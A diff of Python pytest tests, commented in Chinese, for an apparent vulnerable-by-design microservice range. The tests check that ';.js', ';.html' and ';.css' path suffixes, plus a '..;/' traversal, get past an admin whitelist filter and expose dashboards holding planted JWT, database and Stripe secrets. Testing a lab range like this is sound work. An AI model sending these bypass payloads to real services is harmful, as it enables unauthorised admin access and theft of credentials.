@@ -724,3 +724,91 @@ class TestMicroservicePathNormalizationBypass:
         r = _priv_get("api.target.bench", "/api/users/..;/..;/actuator")
         assert r.status_code == 200
         assert "_links" in r.text
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# S18: Admin Whitelist Suffix Bypass
+# api.target.bench — ;.js/;.html 后缀绕过 AdminWhitelistFilter
+# ═══════════════════════════════════════════════════════════════════════
+
+
+class TestAdminWhitelistBypass:
+    """S18: AdminWhitelistFilter 拦截 /admin 路径段但白名单 .js/.html/.css 等后缀。
+    漏洞：getRequestURI() 保留 ;.js → endsWith(".js") → 拦截器放行
+    但 Tomcat 将 ;.js 视为路径参数 → 副离 → servletPath=/api/users/admin/dashboard → 正常路由
+    """
+
+    def test_user_admin_dashboard_js_bypass(self, range_available):
+        """;.js 绕过拦截器访问 user-service admin dashboard"""
+        r = _priv_get("api.target.bench", "/api/users/admin/dashboard;.js")
+        assert r.status_code == 200
+        assert "ADMIN_WHITELIST_BYPASS_USER" in r.text
+
+    def test_order_admin_dashboard_js_bypass(self, range_available):
+        """;.js 绕过拦截器访问 order-service admin dashboard"""
+        r = _priv_get("api.target.bench", "/api/orders/admin/dashboard;.js")
+        assert r.status_code == 200
+        assert "ADMIN_WHITELIST_BYPASS_ORDER" in r.text
+
+    def test_payment_admin_dashboard_js_bypass(self, range_available):
+        """;.js 绕过拦截器访问 payment-service admin dashboard"""
+        r = _priv_get("api.target.bench", "/api/payments/admin/dashboard;.js")
+        assert r.status_code == 200
+        assert "ADMIN_WHITELIST_BYPASS_PAYMENT" in r.text
+
+    def test_user_admin_dashboard_html_bypass(self, range_available):
+        """;.html 后缀同样绕过拦截器"""
+        r = _priv_get("api.target.bench", "/api/users/admin/dashboard;.html")
+        assert r.status_code == 200
+        assert "ADMIN_WHITELIST_BYPASS_USER" in r.text
+
+    def test_user_admin_dashboard_css_bypass(self, range_available):
+        """;.css 后缀同样绕过拦截器"""
+        r = _priv_get("api.target.bench", "/api/users/admin/dashboard;.css")
+        assert r.status_code == 200
+        assert "ADMIN_WHITELIST_BYPASS_USER" in r.text
+
+    def test_user_admin_blocked_direct(self, range_available):
+        """直接访问 /api/users/admin/dashboard → 拦截器阻断"""
+        r = _priv_get("api.target.bench", "/api/users/admin/dashboard")
+        assert r.status_code == 403
+
+    def test_order_admin_blocked_direct(self, range_available):
+        """直接访问 /api/orders/admin/dashboard → 拦截器阻断"""
+        r = _priv_get("api.target.bench", "/api/orders/admin/dashboard")
+        assert r.status_code == 403
+
+    def test_payment_admin_blocked_direct(self, range_available):
+        """直接访问 /api/payments/admin/dashboard → 拦截器阻断"""
+        r = _priv_get("api.target.bench", "/api/payments/admin/dashboard")
+        assert r.status_code == 403
+
+    def test_user_admin_secrets_js(self, range_available):
+        """;.js 绕过后泄露 JWT_SECRET 和 DB_PASSWORD"""
+        r = _priv_get("api.target.bench", "/api/users/admin/dashboard;.js")
+        assert r.status_code == 200
+        assert "JWT_SECRET" in r.text or "Us3rS3rv1ce" in r.text
+
+    def test_payment_admin_secrets_js(self, range_available):
+        """;.js 绕过后泄露 STRIPE_API_KEY"""
+        r = _priv_get("api.target.bench", "/api/payments/admin/dashboard;.js")
+        assert r.status_code == 200
+        assert "STRIPE_API_KEY" in r.text or "sk_live" in r.text
+
+    def test_combo_traversal_suffix_returns_404(self, range_available):
+        """组合攻击路径 ..;/ 穿越 + ;.js 后缀绕过 — 穿越后路径与控制器映射不一致，预期 404。
+        S18 的核心攻击路径是直接后缀绕过 /api/{service}/admin/dashboard;.js，
+        不依赖 ..;/ 穿越。此测试验证组合路径不可行。"""
+        r = _priv_get("api.target.bench", "/api/users/..;/..;/admin/dashboard;.js")
+        assert r.status_code in (403, 404)
+
+    def test_normal_api_users_works(self, range_available):
+        """验证微服务路由基础功能：;.js 绕过路径返回 admin 数据，证明服务存活。"""
+        r = _priv_get("api.target.bench", "/api/users/admin/dashboard;.js")
+        assert r.status_code == 200
+        assert "admin" in r.text
+
+    def test_non_whitelisted_suffix_blocked(self, range_available):
+        """;.py 等非白名单后缀不应绕过拦截器"""
+        r = _priv_get("api.target.bench", "/api/users/admin/dashboard;.py")
+        assert r.status_code == 403
